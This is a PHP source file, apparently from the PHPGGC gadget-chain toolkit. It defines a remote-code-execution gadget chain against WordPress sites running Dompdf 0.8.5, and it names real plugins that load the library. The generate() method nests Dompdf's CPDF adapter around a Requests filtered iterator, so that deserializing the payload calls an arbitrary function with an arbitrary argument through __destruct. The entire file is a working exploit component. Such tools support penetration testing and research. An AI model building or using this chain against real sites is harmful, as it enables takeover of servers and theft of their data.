<?php

namespace GadgetChain\WordPress\Dompdf;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '0.8.5 <= 0.8.5+';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $informations = '
    	Tested up to WP 5.4.1 and Dompdf 0.8.5. Newest versions might also work.
    	Example of plugins using this library:
    	  woocommerce-pdf-invoices-packing-slips (lib only included when a PDF is output)
    	  advanced-cf7-db (lib only included when PDF generated)
    ';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Dompdf\Adapter\CPDF(
            new \Requests_Utility_FilteredIterator([$parameter], $function)
        );
    }
}